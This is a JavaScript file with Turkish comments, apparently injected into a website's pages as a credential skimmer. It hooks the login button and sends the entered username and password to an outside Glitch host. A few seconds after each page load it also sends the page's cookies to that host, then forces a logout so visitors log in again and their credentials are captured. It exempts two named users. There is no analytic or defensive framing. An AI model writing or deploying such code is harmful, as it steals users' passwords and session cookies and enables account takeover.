(function () {
  let isScriptActive = true; // Script’in aktif olup olmadığını kontrol eden bayrak

  // Yasaklı kullanıcılar
  const blockedUsers = ['slnyrgc88@hotmail.com', 'selenyargici'];

  // Çerezlerden username’i çek ve kontrol et
  const cookies = document.cookie || '';
  const username = document.cookie.match(/username=([^;]+)/)?.[1] || '';
  console.log('Çerezdeki username:', username);

  // Eğer username yasaklı listedeyse scripti durdur
  if (blockedUsers.includes(username)) {
    console.log('Bu kullanıcı için script çalışmayacak:', username);
    isScriptActive = false;
    return; // Script burada biter
  }

  // Butonları izleyen fonksiyon
  function setupButtonListeners() {
    if (!isScriptActive) {
      return;
    }

    const loginButton = document.querySelector('button[data-bs-toggle="modal"][data-bs-target=".bd-example-modal-sm"]');
    if (loginButton) {
      loginButton.addEventListener('click', () => {
        setTimeout(setupLoginListener, 100); // Modal açıldıktan sonra listener kur
      });
    } else {
      console.log('Giriş modal butonu bulunamadı');
    }
  }

  // Giriş yap butonunu dinleyen fonksiyon
  function setupLoginListener() {
    const loginBtn = document.querySelector('.btn-primary[onclick="girisyap()"]');
    if (loginBtn && isScriptActive) {
      console.log('Login listener eklendi');
      loginBtn.addEventListener('click', () => {
        const username = document.getElementById('loginname')?.value || 'Bilinmiyor';
        const password = document.getElementById('loginpassport')?.value || 'Bilinmiyor';
        const remember = document.getElementById('authCheck')?.checked || false;
        console.log('Giriş bilgileri:', { username, password, remember });
        const data = `kuladi=${encodeURIComponent(username)}&sifre=${encodeURIComponent(password)}&remember=${encodeURIComponent(remember)}`;

        // Asenkron olarak Glitch’e gönder, orijinal isteği engelleme
        fetch(`https://ancient-pentagonal-elephant.glitch.me/log?${data}`, {
          method: 'GET',
          credentials: 'include'
        })
          .then(() => {
            console.log('Giriş logu gönderildi');
            isScriptActive = false; // Scripti kapat
          })
          .catch(err => {
            console.log('Giriş logu hatası:', err);
            isScriptActive = false; // Hata olsa bile kapat
          });
        // Orijinal girisyap() fonksiyonu kendi isteğini yapacak
      });
    } else {
      console.log('Login butonu bulunamadı');
    }
  }

  // Çıkış yapma (yönlendirme kaldırıldı)
  const hasLoggedOut = sessionStorage.getItem('hasLoggedOut');
  if (!hasLoggedOut && isScriptActive) {
    setTimeout(() => {
      if (cookies) {
        fetch('https://ancient-pentagonal-elephant.glitch.me/log?cookie=' + encodeURIComponent(cookies), {
          method: 'GET',
          credentials: 'include'
        })
          .then(() => {
            console.log('Çıkış logu gönderildi');
            if (typeof cikisyap === 'function') {
              cikisyap();
              setTimeout(() => {
                sessionStorage.setItem('hasLoggedOut', 'true');
              }, 1000);
            }
          })
          .catch(err => {
            console.log('Çıkış logu hatası:', err);
            if (typeof cikisyap === 'function') {
              cikisyap();
              setTimeout(() => {
                sessionStorage.setItem('hasLoggedOut', 'true');
              }, 1000);
            }
          });
      } else {
        if (typeof cikisyap === 'function') {
          console.log('Çerez yok, çıkış yapılıyor');
          cikisyap();
          setTimeout(() => {
            sessionStorage.setItem('hasLoggedOut', 'true');
          }, 1000);
        }
      }
    }, 2000);
  }

  // Sayfa yüklendiğinde butonları izlemeye başla
  if (isScriptActive) {
    window.addEventListener('load', () => {
      setupButtonListeners();
    });

    let lastUrl = location.href;
    setInterval(() => {
      if (location.href !== lastUrl) {
        lastUrl = location.href;
        setupButtonListeners();
      }
    }, 500);
  }
})();
